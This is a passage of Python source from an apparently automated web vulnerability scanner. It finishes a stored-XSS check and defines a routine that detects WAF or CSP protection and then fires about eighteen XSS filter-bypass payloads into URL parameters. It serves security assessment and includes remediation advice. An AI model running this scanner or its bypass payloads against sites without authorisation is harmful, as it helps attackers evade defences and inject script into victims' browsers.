                                "remediation": "Implement proper input sanitization and output encoding. Use a Content Security Policy (CSP) and consider using a library like DOMPurify for sanitization."
                            })
                    
                    # Check main page and common listing pages where content might appear
                    # For example, a comment might appear on the main article page
                    pages_to_check = [url]
                    
                    # Add other potential pages where content might be displayed
                    parsed_url = urlparse(url)
                    base_path = parsed_url.path
                    
                    # Check for common content listing pages
                    if base_path.endswith('/'):
                        pages_to_check.append(urljoin(url, 'index.html'))
                        pages_to_check.append(urljoin(url, 'comments'))
                        pages_to_check.append(urljoin(url, 'posts'))
                    elif '.' in base_path.split('/')[-1]:  # Has file extension
                        directory = base_path.rsplit('/', 1)[0] + '/'
                        pages_to_check.append(urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}{directory}", 'index.html'))
                        pages_to_check.append(urljoin(f"{parsed_url.scheme}://{parsed_url.netloc}{directory}", 'comments'))
                    
                    # Check these pages for our payload
                    for page_url in pages_to_check:
                        if page_url == response_url:
                            continue  # Skip if we already checked this URL
                        
                        try:
                            async with semaphore:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(
                                        page_url,
                                        timeout=aiohttp.ClientTimeout(total=10)
                                    ) as page_response:
                                        if page_response.status != 200:
                                            continue
                                        page_text = await page_response.text()
                            
                            if stored_xss_payload in page_text:
                                vulnerabilities.append({
                                    "id": str(uuid.uuid4()),
                                    "name": "Stored Cross-Site Scripting (XSS)",
                                    "description": "Stored XSS vulnerability detected where user input is stored and displayed without proper sanitization",
                                    "severity": "critical",
                                    "location": f"{form_url} -> {page_url}",
                                    "evidence": f"Payload '{stored_xss_payload}' was stored and reflected in the page",
                                    "remediation": "Implement proper input sanitization and output encoding. Use a Content Security Policy (CSP) and consider using a library like DOMPurify for sanitization."
                                })
                                break  # Found a vulnerability, no need to check other pages
                        except Exception:
                            continue  # Skip if we can't check this page
                
                except Exception as e:
                    print(f"Error checking for stored XSS in form {form_url}: {str(e)}")
        
        except Exception as e:
            print(f"Error checking for stored XSS: {str(e)}")
        
        return vulnerabilities
    
    async def _test_waf_bypass(self, url: str, semaphore: asyncio.Semaphore) -> List[Dict[str, Any]]:
        """
        Test if WAF/XSS protection can be bypassed using advanced techniques.
        
        Args:
            url: The URL to check
            semaphore: Semaphore to limit concurrent requests
            
        Returns:
            A list of vulnerabilities found
        """
        vulnerabilities = []
        
        try:
            # First check if there are any URL parameters
            parsed_url = urlparse(url)
            original_params = parse_qs(parsed_url.query)
            
            if not original_params:
                return []  # No parameters to test
            
            # Check for WAF or XSS protection
            async with semaphore:
                async with aiohttp.ClientSession() as session:
                    # Send a basic test with a simple XSS payload
                    test_payload = "<script>alert(1)</script>"
                    
                    test_params = deepcopy(original_params)
                    for param in test_params:
                        test_params[param] = [test_payload]
                    
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                          parsed_url.params, test_query, parsed_url.fragment))
                    
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        response_text = await response.text()
                        
                        # Check for WAF or XSS protection signatures in response
                        waf_detected = any(signature in response_text.lower() for signature in [
                            "waf", "firewall", "blocked", "security", "protection",
                            "attack", "malicious", "xss", "injection", "forbidden",
                            "403 forbidden", "request blocked", "suspicious"
                        ])
                        
                        # Also check for XSS protection headers
                        has_protection = any(h.lower() in ['x-xss-protection', 'content-security-policy'] 
                                          for h in response.headers)
                        
                        waf_detected = waf_detected or has_protection
            
            # If WAF/protection is detected, try bypass techniques
            if waf_detected:
                # Advanced WAF bypass payloads
                bypass_payloads = [
                    # Mixed case bypass
                    "<ScRiPt>alert('XSS')</sCrIpT>",
                    # HTML entities bypass
                    "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;alert('XSS')&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;",
                    # JavaScript escape bypass
                    "<img src=x onerror=\\x61\\x6C\\x65\\x72\\x74('XSS')>",
                    # Null byte injection
                    "<scri\x00pt>alert('XSS')</scri\x00pt>",
                    # Protocol resolution bypass
                    "<a href='javascript\x3Aalert(`XSS`)'>click me</a>",
                    # Double encoding
                    "%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E",
                    # DOM attribute bypass
                    "<div onclick=\"alert('XSS')\">Click me</div>",
                    # CSS expression bypass
                    "<style>body{background-image:url('javascript:alert(\"XSS\")')}</style>",
                    # SVG bypass
                    "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                    # URL encoding bypass
                    "%3Cimg%20src%3Dx%20onerror%3Dalert%28%27XSS%27%29%3E",
                    # Data URI bypass
                    "<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=\">click me</a>",
                    # UTF-7 encoding bypass
                    "+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-",
                    # Content splitting bypass
                    "</script><script>alert('XSS')</script>",
                    # Line separator bypass
                    "<img\nsrc=x\nonerror=alert('XSS')>",
                    # Extraneous open brackets
                    "<<script>alert('XSS');//<</script>",
                    # No quotes or semicolons
                    "<img src=x onerror=alert`XSS`>",
                    # Angular.js bypass
                    "{{constructor.constructor('alert(\"XSS\")')()}}",
                    # React.js bypass
                    "React.createElement('a',{dangerouslySetInnerHTML:{__html:'<img src=x onerror=alert(\"XSS\")>'}});"
                ]
                
                # Test each bypass payload
                for bypass_payload in bypass_payloads:
                    # Create a unique test ID
                    test_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
                    customized_payload = bypass_payload.replace("XSS", test_id).replace("'XSS'", f"'{test_id}'").replace('"XSS"', f'"{test_id}"')
                    
                    # Test each parameter with the payload
                    for param_name, param_values in original_params.items():
                        test_params = deepcopy(original_params)
                        test_params[param_name] = [customized_payload]
                        
                        test_query = urlencode(test_params, doseq=True)
                        test_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, 
                                              parsed_url.params, test_query, parsed_url.fragment))
                        
                        try:
                            async with semaphore:
                                async with aiohttp.ClientSession() as session:
                                    async with session.get(
                                        test_url, 
                                        timeout=aiohttp.ClientTimeout(total=10)
                                    ) as response:
                                        if response.status == 403 or response.status == 406:
                                            # Request was blocked, try the next payload
                                            continue
                                            
                                        response_text = await response.text()
                            
                            # Check if our payload was reflected without being neutralized
                            if bypass_payload in response_text or test_id in response_text:
                                # Further validate to reduce false positives
                                if self._validate_xss_reflection(response_text, bypass_payload, test_id):
                                    vulnerabilities.append({
                                        "id": str(uuid.uuid4()),
                                        "name": "WAF/XSS Protection Bypass",
                                        "description": f"WAF or XSS protection was bypassed using payload: {bypass_payload}",
                                        "severity": "critical",
                                        "location": url,
                                        "evidence": f"Parameter '{param_name}' with bypass payload was reflected in the response",
                                        "remediation": "Update WAF rules and implement proper context-aware output encoding. Consider using a more comprehensive security solution and multiple layers of defense."
                                    })
                                    # Found a working bypass, no need to test more payloads
                                    break
                        
                        except Exception as e:
                            print(f"Error testing WAF bypass with payload {bypass_payload}: {str(e)}")
                    
                    # If we found a working bypass, no need to test more payloads
                    if vulnerabilities:
                        break
        
        except Exception as e:
            print(f"Error testing WAF bypass: {str(e)}")
        
        return vulnerabilities 